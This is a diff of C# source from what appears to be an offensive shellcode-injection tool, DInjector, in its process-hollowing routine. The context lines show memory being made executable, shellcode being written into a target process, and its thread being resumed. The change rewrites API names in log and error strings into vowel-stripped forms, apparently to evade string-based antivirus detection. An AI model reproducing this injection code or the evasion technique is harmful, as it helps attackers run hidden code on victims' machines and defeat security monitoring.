@@ -37,9 +37,9 @@ namespace DInjector
                 ref returnLength);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ProcessHollowing) [+] NtQueryInformationProcess");
+                Console.WriteLine("(ProcessHollowing) [+] NtQryInfrmtnPrcss");
             else
-                throw new Exception($"(ProcessHollowing) [-] NtQueryInformationProcess: {ntstatus}");
+                throw new Exception($"(ProcessHollowing) [-] NtQryInfrmtnPrcss: {ntstatus}");
 
             #endregion
 
@@ -60,9 +60,9 @@ namespace DInjector
                 ref bytesRead);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ProcessHollowing) [+] NtReadVirtualMemory");
+                Console.WriteLine("(ProcessHollowing) [+] NtRdVrtlMmry");
             else
-                throw new Exception($"(ProcessHollowing) [-] NtReadVirtualMemory: {ntstatus}");
+                throw new Exception($"(ProcessHollowing) [-] NtRdVrtlMmry: {ntstatus}");
 
             byte[] baseAddressBytes = new byte[bytesRead];
             Marshal.Copy(baseAddress, baseAddressBytes, 0, (int)bytesRead);
@@ -83,9 +83,9 @@ namespace DInjector
                 ref bytesRead);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ProcessHollowing) [+] NtReadVirtualMemory");
+                Console.WriteLine("(ProcessHollowing) [+] NtRdVrtlMmry");
             else
-                throw new Exception($"(ProcessHollowing) [-] NtReadVirtualMemory: {ntstatus}");
+                throw new Exception($"(ProcessHollowing) [-] NtRdVrtlMmry: {ntstatus}");
 
             byte[] dataBytes = new byte[bytesRead];
             Marshal.Copy(data, dataBytes, 0, (int)bytesRead);
@@ -116,9 +116,9 @@ namespace DInjector
                 ref oldProtect);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ProcessHollowing) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE");
+                Console.WriteLine("(ProcessHollowing) [+] NtPrtctVrtlMmry, PAGE_EXECUTE_READWRITE");
             else
-                throw new Exception($"(ProcessHollowing) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE: {ntstatus}");
+                throw new Exception($"(ProcessHollowing) [-] NtPrtctVrtlMmry, PAGE_EXECUTE_READWRITE: {ntstatus}");
 
             #endregion
 
@@ -138,9 +138,9 @@ namespace DInjector
                 ref bytesWritten);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ProcessHollowing) [+] NtWriteVirtualMemory, shellcode");
+                Console.WriteLine("(ProcessHollowing) [+] NtWrtVrtlMmry, shellcode");
             else
-                throw new Exception($"(ProcessHollowing) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");
+                throw new Exception($"(ProcessHollowing) [-] NtWrtVrtlMmry, shellcode: {ntstatus}");
 
             #endregion
 
@@ -158,9 +158,9 @@ namespace DInjector
                 ref tmpProtect);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ProcessHollowing) [+] NtProtectVirtualMemory, oldProtect");
+                Console.WriteLine("(ProcessHollowing) [+] NtPrtctVrtlMmry, oldProtect");
             else
-                throw new Exception($"(ProcessHollowing) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");
+                throw new Exception($"(ProcessHollowing) [-] NtPrtctVrtlMmry, oldProtect: {ntstatus}");
 
             #endregion
 
@@ -173,9 +173,9 @@ namespace DInjector
                 ref suspendCount);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ProcessHollowing) [+] NtResumeThread");
+                Console.WriteLine("(ProcessHollowing) [+] NtRsmThrd");
             else
-                throw new Exception($"(ProcessHollowing) [-] NtResumeThread: {ntstatus}");
+                throw new Exception($"(ProcessHollowing) [-] NtRsmThrd: {ntstatus}");
 
             #endregion
 
